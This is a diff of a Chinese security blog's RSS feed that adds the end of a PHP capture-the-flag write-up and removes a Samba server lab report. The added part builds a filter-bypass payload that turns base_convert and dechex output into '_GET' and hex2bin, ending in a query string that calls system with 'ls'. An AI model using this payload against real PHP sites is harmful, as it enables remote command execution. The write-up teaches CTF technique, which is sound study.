+&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;题中可用于进制转换的函数
+&amp;#39;base_convert&amp;#39;-任意进制之间转换
+&amp;#39;bindec&amp;#39;-把二进制转换为十进制
+&amp;#39;decbin&amp;#39;-把十进制转还为二进制
+&amp;#39;dechex&amp;#39;-十进制转16进制
+&amp;#39;decoct&amp;#39;-八进制转16进制&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;想办法构造&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$_GET[a]($_GET[b]);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;[]被过滤了，可以使用&amp;#123;&amp;#125;代替，16进制有字母，将16进制转10进制
+想利用hex2bin()实现进制与字符串相互，也得构建一下
+&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&#34;token variable&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_GET&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;base_convert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;hex2bin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;base_convert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;base_convert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;hex2bin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;//37907361743hex2bin&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&#34;token variable&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_GET&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;//echo base_convert(&#39;hex2bin&#39;,36,10);&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;base_convert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;37907361743&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;bin2hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;_GET&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;hexdec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;5f474554&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;hex2bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;dechex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;1598506324&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;//hex2bin5f4745541598506324_GET&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;再将语句拼接一下&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token function&#34;&gt;base_convert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;37907361743&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;dechex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;1598506324&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+最后的payload
+&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;c&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$pi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;base_convert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;37907361743&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;dechex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1598506324&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$$pi&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$$pi&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;system&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ls&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101152741080.png&#34; alt=&#34;image-20221101152741080&#34; /&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -1980,136 +2048,6 @@ DNS1&amp;#x3D;&amp;quot;xxx.xxx.xxx.xxx&amp;quot;        &amp;#x2F;&amp;#x2F;新
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/</guid>
-            <title>Samba共享</title>
-            <link>https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/</link>
-            <category term="Linux" scheme="https://blog.xcu.icu/categories/Linux/" />
-            <category term="Samba" scheme="https://blog.xcu.icu/tags/Samba/" />
-            <pubDate>Mon, 24 Oct 2022 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h2 id=&#34;实验2samba服务器配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实验2samba服务器配置&#34;&gt;#&lt;/a&gt; 实验 2：Samba 服务器配置&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;实验目的&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;1、了解 Samba 协议，理解 Samba 的工作原理&lt;/p&gt;
-&lt;p&gt;3、熟练掌握 Samba 服务器的配置和故障排除的思路、方法技巧&lt;/p&gt;
-&lt;p&gt;4、深入理解 Linux 的文件权限管理&lt;/p&gt;
-&lt;p&gt;4、掌握防火墙 Firewall 的基本配置&lt;/p&gt;
-&lt;p&gt;5、初步学会配置 SELinux&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;实验参考&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;实验步骤可参考《2-1-Samba 服务器配置匿名共享.pdf》文件。&lt;/p&gt;
-&lt;p&gt;实验步骤可参考《2-2-Samba 服务器配置_安全共享.pdf》文件。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;1实验要求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1实验要求&#34;&gt;#&lt;/a&gt; 1. 实验要求&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;任务 1：配置 yum 源，使用光盘镜像或者阿里云的 YUM 源安装 Samba 服务包。&lt;br /&gt;
-任务 2：Samba 匿名访问（不需要密码的分享），物理主机匿名访问 Samba 服务器上的共享目录 /tmp 和 /share。&lt;/p&gt;
-&lt;p&gt;任务 3：Samba 服务器配置_安全共享。一个小组（公司技术部）共同开发一个项目，所有的项目文件都存放在 Samba 服务器一个共享目录 (/home/project)。要求：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;公司每位成员使用用户名 / 密码访问 Samba 共享服务器，但只有技术部的成员可以访问部门的共享目录 /home/project。&lt;/li&gt;
-&lt;li&gt;技术部每位成员在共享目录 /home/project 新建的文件都属于技术部组。&lt;/li&gt;
-&lt;li&gt;技术部每位成员都可以对其他用户建立的文件进行读写操作，但每位用户只能删除自己的文件，不能删除其他用户建立的文件。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;其他要求：&lt;/p&gt;
-&lt;p&gt;虚拟机主机名为 “Samba-xxx”，其中 xxx 为自己的姓名拼音简写；测试客户端的主机名修改为 “Client-xxx”&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;2实验过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2实验过程&#34;&gt;#&lt;/a&gt; 2. 实验过程&lt;/h3&gt;
-&lt;h4 id=&#34;21-yum源配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-yum源配置&#34;&gt;#&lt;/a&gt; 2.1 yum 源配置&lt;/h4&gt;
-&lt;p&gt;首先将进入到配置目录，将原有的仓库文件进行一个备份&lt;/p&gt;
-&lt;p&gt;先创建一个文件夹来存放备份的文件，如下图 1-1&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTEzMDc2MTMucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022211307613.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20221022211307613&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
-&lt;p&gt;​																			图 1-1，建立文件夹&lt;/p&gt;
-&lt;p&gt;将文件移动进去后，配置一个阿里的 yum 源，如图 1-2&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTI0NDc0ODEucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022212447481.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20221022212447481&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
-&lt;p&gt;​                                                                                 图 1-2，yum 源配置&lt;/p&gt;
-&lt;h4 id=&#34;22-samba匿名共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-samba匿名共享&#34;&gt;#&lt;/a&gt; 2.2 Samba 匿名共享&lt;/h4&gt;
-&lt;h5 id=&#34;221-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-环境准备&#34;&gt;#&lt;/a&gt; 2.2.1 环境准备&lt;/h5&gt;
-&lt;p&gt;应老师要求这里不关闭防火墙和 SELinux&lt;/p&gt;
-&lt;p&gt;建立一个共享目录 /public，安装 samba 服务程序包如图 2-1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022213412121.png&#34; alt=&#34;image-20221022213412121&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;​                                                                                 图 2-1，环境准备&lt;/p&gt;
-&lt;h5 id=&#34;222-修改配置文件etcsambasmbconf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-修改配置文件etcsambasmbconf&#34;&gt;#&lt;/a&gt; 2.2.2 修改配置文件 /etc/samba/smb.conf&lt;/h5&gt;
-&lt;p&gt;进入 samba 目录，将源文件备份，修改 smb.conf 文件如图 2-2&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214043968.png&#34; alt=&#34;image-20221022214043968&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;​                                                                    图 2-2，修改配置文件&lt;/p&gt;
-&lt;p&gt;修改配置文件内如如下图 2-3&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214220044.png&#34; alt=&#34;image-20221022214220044&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;​                                                                      图 2-3，配置文件内容&lt;/p&gt;
-&lt;h5 id=&#34;223启动环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223启动环境&#34;&gt;#&lt;/a&gt; 2.2.3 启动环境&lt;/h5&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;[root@Samba-lq samba]# testparm #语法检查
-[root@Samba-lq samba]# service nmb start #开启nmb服务
-[root@Samba-lq samba]# service smb start #开启smb服务&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;检查语法如下图 2-4&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214900363.png&#34; alt=&#34;image-20221022214900363&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;​                                                                          图 2-4，语法测试&lt;/p&gt;
-&lt;p&gt;开启 nmb 和 smb 服务如图 2-5&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214957516.png&#34; alt=&#34;image-20221022214957516&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;​                                                                          图 2-5，开启服务&lt;/p&gt;
-&lt;h5 id=&#34;224设置防火墙规则和selinux规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#224设置防火墙规则和selinux规则&#34;&gt;#&lt;/a&gt; 2.2.4 设置防火墙规则和 SELinux 规则&lt;/h5&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;[root@Samba-lq samba]# firewall-cmd --permanent --zone&amp;#x3D;public --add-service&amp;#x3D;samba
-[root@Samba-lq samba]# firewall-cmd --reload
-[root@Samba-lq samba]# firewall-cmd --list-services
-[root@Samba-lq samba]# chcon -t samba_share_t &amp;#x2F;public&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;配置如下图 2-5&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221106832.png&#34; alt=&#34;image-20221022221106832&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;​																		图 2-5，配置效果图&lt;/p&gt;
-&lt;h5 id=&#34;225共享目录进入要密码解决&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#225共享目录进入要密码解决&#34;&gt;#&lt;/a&gt; 2.2.5 共享目录进入要密码解决&lt;/h5&gt;
-&lt;p&gt;问题截图如下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221620593.png&#34; alt=&#34;image-20221022221620593&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里因为我使用的是老师给的配置文件，发现配置文件在 public 的配置中没有 guest ok 允许匿名共享&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221815533.png&#34; alt=&#34;image-20221022221815533&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;tmp 能够正常访问&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221859980.png&#34; alt=&#34;image-20221022221859980&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;修改后能正常访问&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222048533.png&#34; alt=&#34;image-20221022222048533&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;226共享目录不能正常写入文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#226共享目录不能正常写入文件&#34;&gt;#&lt;/a&gt; 2.2.6 共享目录不能正常写入文件&lt;/h5&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222139179.png&#34; alt=&#34;image-20221022222139179&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里是因为 public 权限问题，这里更改权限&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222345913.png&#34; alt=&#34;image-20221022222345913&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;更改后能够正常访问文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222414216.png&#34; alt=&#34;image-20221022222414216&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;23samba安全共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23samba安全共享&#34;&gt;#&lt;/a&gt; 2.3Samba 安全共享&lt;/h4&gt;
-&lt;h5 id=&#34;231环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231环境准备&#34;&gt;#&lt;/a&gt; 2.3.1 环境准备&lt;/h5&gt;
-&lt;p&gt;关闭防火墙和 SELinux&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230620906.png&#34; alt=&#34;image-20221022230620906&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;创建共享目录并设置权限&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230755058.png&#34; alt=&#34;image-20221022230755058&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;232修改配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232修改配置文件&#34;&gt;#&lt;/a&gt; 2.3.2 修改配置文件&lt;/h5&gt;
-&lt;p&gt;进入 /etc/samba 目录修改 smb.conf 文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231259199.png&#34; alt=&#34;image-20221022231259199&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;重启服务&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231355253.png&#34; alt=&#34;image-20221022231355253&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;233创建共享用户根据权限访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233创建共享用户根据权限访问&#34;&gt;#&lt;/a&gt; 2.3.3 创建共享用户，根据权限访问&lt;/h5&gt;
-&lt;p&gt;创建系统用户&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221022231649122.png&#34; alt=&#34;image-20221022231649122&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;修改系统用户密码&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232021237.png&#34; alt=&#34;image-20221022232021237&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;创建管理 shamab 用户（使用 pdbedit 管理 Samba）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232202251.png&#34; alt=&#34;image-20221022232202251&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;查看所有的共享用户&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232421854.png&#34; alt=&#34;image-20221022232421854&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;2.3.4windows 客户端利用账户 lisi 访问&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235143521.png&#34; alt=&#34;image-20221022234754805&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;创建测试文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235324326.png&#34; alt=&#34;image-20221022235324326&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;linu 上面用张三登录&lt;/p&gt;
